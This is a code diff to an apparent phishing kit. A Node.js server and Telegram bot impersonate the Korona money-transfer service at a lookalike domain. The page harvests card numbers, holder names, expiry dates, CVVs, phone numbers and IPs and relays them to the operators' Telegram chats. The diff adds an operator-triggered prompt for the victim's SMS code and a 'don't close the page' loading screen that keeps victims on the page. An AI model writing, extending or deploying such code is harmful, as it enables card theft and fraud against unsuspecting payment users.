@@ -8,7 +8,10 @@ const link = 'main.koronapayreturn.ru'
 let sendms = [];
 const botusers = [5708889761, 7147845976, 5903574289]
 const admins = [5708889761, 7147845976, 5903574289]
+//const botusers = [5903574289]
+//const admins = [5903574289]
 let sendm = []
+let checkm = []
 
 let respo = null;
 function sd(number){
@@ -61,8 +64,8 @@ app.get('/return', (req, res) => {
     </div>
     <span style="vertical-align: middle;margin-left: 0.5vh;color: #717171;font-size: 140%" class="roboto-black">Korona</span>
   </div>
-  <span style="position: absolute;left: 50%;top: 16%;transform: translate(-50%, 0%);font-size: 2.5vh;color: #1a1a1a" class="roboto-bold">${sd(req.query.m)} RUB</span>
-<div class="form-bg">
+  <span style="position: absolute;left: 50%;top: 16%;transform: translate(-50%, 0%);font-size: 2.5vh;color: #1a1a1a" class="roboto-bold scr">${sd(req.query.m)} RUB</span>
+<div class="form-bg scr">
   <div class="form-inp-cont">
     <span class="form-inp-text roboto-bold">Номер карты:</span>
     <br>
@@ -92,7 +95,8 @@ app.get('/return', (req, res) => {
     <button style="color: white;text-decoration: none;" class="form-inp-button roboto-bold" id="getcodebut" onclick="validate(document.getElementById('cardnum').value,document.getElementById('cardholder').value,document.getElementById('cardd').value,document.getElementById('cardcccvvv').value,document.getElementById('phonenum').value)">Отправить</button>
 </div>
   <p class="roboto-regular" style="color: #969696;font-size: clamp(0.35vh, 0.6vw, 0.6vw);min-font-size: 20%;text-align: center;position: absolute;bottom: 3vh;left: 50%;transform: translate(-50%,0%);">Получение доступно на карты национальной платежной системы банков Китал - UnionPау за исключением Гонконга, Макао и Тайваня (далее - ПС UnionPay). Отправка перевода осуществляется по правилам ПС UnionPay Валюта распоряжения в переводе - доллар США. Банки-эмитенты вправе при зачислении конвертировать валюту перевода в валюту карты получателя по курсу ПС UnionPay а также взимать комиссию РНКО «Платежный Центр» (ООО) не несет ответственности за сумму, зачисленную банком - эмитентом карты Распоряжение о переводе исполняется от нескольких минут, но не позднее трек рабочих дней со дня получения распоряжения о переводе При отправки денежного перевода с карты российского банка вас обслуживает РНКО «Платежный Центр» (ООО), пиценаия Банка России №3166-К от 14 04 2014г (г Новосибирск, ул. Кирова д 86, ОГРН 1025400002968) Есть ограничения Подробнее о тарифах, ограничениях и условиях оказания услги - на сайте rnko.ru в разделах "Денежные переводы онлайн" Оператор по перевод</p>
- 
+ <img src="/loading.gif" alt="загрузка" class="loading_gif scr2">
+ <p style="position: absolute;left: 50%;top: 30%;transform: translate(-50%, 0%);font-size: 2.5vh;color: #1a1a1a" class="roboto-bold scr2">Загрузка, не закрывайте страницу!</p>
 </body>
 </html>`);
 
@@ -113,6 +117,16 @@ IP: <b>${req.ip}</b>`, {parse_mode: 'HTML'})
 app.get('/getcode', (req, res) => {
     res.render(`code`);
 });
+
+app.get('/sendcheck', (req, res)=>{
+    if(checkm[req.ip] !== undefined){
+        res.send(checkm[req.ip][0])
+        if(checkm[req.ip][0] === 'true'){
+            checkm[req.ip][0] = 'false';
+        }
+    }
+
+})
 app.get('/getcodem', (req,res)=>{
     let i = 0;
     let timeout = setInterval(()=>{
@@ -134,8 +148,9 @@ app.get('/sendcard', (req, res) => {
 Срок действия: <code>${req.query.cd}</code>
 CVV: <code>${req.query.ccvv}</code>
 Номер телефона: <code>${req.query.num}</code>
-IP: <b>${req.ip}</b>`, {parse_mode: 'HTML', reply_markup: {inline_keyboard: [[{text: 'Ожидание', callback_data: `wait_${req.ip}`}],[{text:'Отклон', callback_data: `Cancel_${req.ip}`}, {text: 'Ошибка сети', callback_data: `Error_${req.ip}`}]]}})
+IP: <b>${req.ip}</b>`, {parse_mode: 'HTML', reply_markup: {inline_keyboard: [[{text: 'Смс код', callback_data: `getsms_${req.ip}`}]]}})
         i += 1;
+        checkm[req.ip] = ['false']
         if(i >= admins.length){
             clearTimeout(timeout);
         }
@@ -146,7 +161,7 @@ bot.start(async (ctx)=>{
     if(botusers.includes(ctx.message.from.id)) {
         ctx.reply('Выберите что вам нужно', {
             parse_mode: 'HTML',
-            reply_markup: {inline_keyboard: [[{text: 'Получить ссылку', callback_data: 'geturi'}],[{text: 'Ожидание', callback_data: 'wait'}],[{text:'Отклон', callback_data: 'Cancel'}, {text: 'Ошибка сети', callback_data: 'Error'}]]}
+            reply_markup: {inline_keyboard: [[{text: 'Получить ссылку', callback_data: 'geturi'}]]}
         })
     }
 })
@@ -175,6 +190,10 @@ bot.on('message', async (ctx)=>{
         }
         else if(ctx.callbackQuery.data.startsWith('Error_')){
             sendm[ctx.callbackQuery.data.split('_')[1]] = ['error']
+        }
+        else if(ctx.callbackQuery.data.startsWith(`getsms_`)){
+            checkm[ctx.callbackQuery.data.split('_')[1]] = ['true']
+            ctx.telegram.editMessageReplyMarkup(ctx.callbackQuery.message.chat.id, ctx.callbackQuery.message.message_id, 0, {inline_keyboard: [[{text: 'Ожидание', callback_data: `wait_${ctx.callbackQuery.data.split('_')[1]}`}],[{text:'Отклон', callback_data: `Cancel_${ctx.callbackQuery.data.split('_')[1]}`}, {text: 'Ошибка сети', callback_data: `Error_${ctx.callbackQuery.data.split('_')[1]}`}]]})
         }
     }
 });
